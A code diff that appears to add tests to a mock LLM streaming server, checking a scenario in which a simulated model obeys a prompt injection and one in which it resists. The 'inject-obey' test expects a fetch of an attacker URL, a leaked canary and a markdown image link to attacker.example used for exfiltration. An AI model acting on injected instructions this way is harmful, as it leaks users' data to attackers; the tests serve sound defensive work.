@@ -2,6 +2,7 @@ import request from "supertest";
 import { describe, expect, it } from "vitest";
 import { createApp } from "../app.js";
 import { loadConfig } from "../config.js";
+import { ATTACKER_FETCH_URL, INJECTION_CANARY } from "../llm/scenarios.js";
 
 const app = () => createApp(loadConfig({ TTFT_MS: "0", TOKEN_INTERVAL_MS: "0", TOKENS: "6" })).app;
 
@@ -71,6 +72,24 @@ describe("POST /anthropic/v1/messages (stream)", () => {
     const tool = frames.find((f) => f.data.delta?.type === "input_json_delta")!;
     expect(JSON.parse(tool.data.delta.partial_json)).toEqual({ url: "https://example.com" });
     expect(frames.at(-2)!.data.delta.stop_reason).toBe("end_turn");
+  });
+
+  it("inject-obey fetches the attacker page, leaks the canary and renders the exfiltration image", async () => {
+    const { frames } = await stream("inject-obey");
+    const tool = frames.find((f) => f.data.delta?.type === "input_json_delta")!;
+    expect(JSON.parse(tool.data.delta.partial_json)).toEqual({ url: ATTACKER_FETCH_URL });
+    const text = frames.filter((f) => f.data.delta?.type === "text_delta").map((f) => f.data.delta.text).join("");
+    expect(text).toContain(INJECTION_CANARY);
+    expect(text).toContain("![status](https://attacker.example/");
+  });
+
+  it("inject-resist answers in plain text without a fetch or a leak", async () => {
+    const { frames } = await stream("inject-resist");
+    const starts = frames.filter((f) => f.event === "content_block_start").map((f) => f.data.content_block.type);
+    expect(starts).toEqual(["text"]);
+    const text = frames.filter((f) => f.data.delta?.type === "text_delta").map((f) => f.data.delta.text).join("");
+    expect(text).not.toContain(INJECTION_CANARY);
+    expect(text).not.toContain("attacker.example");
   });
 
   it("stops with max_tokens", async () => {
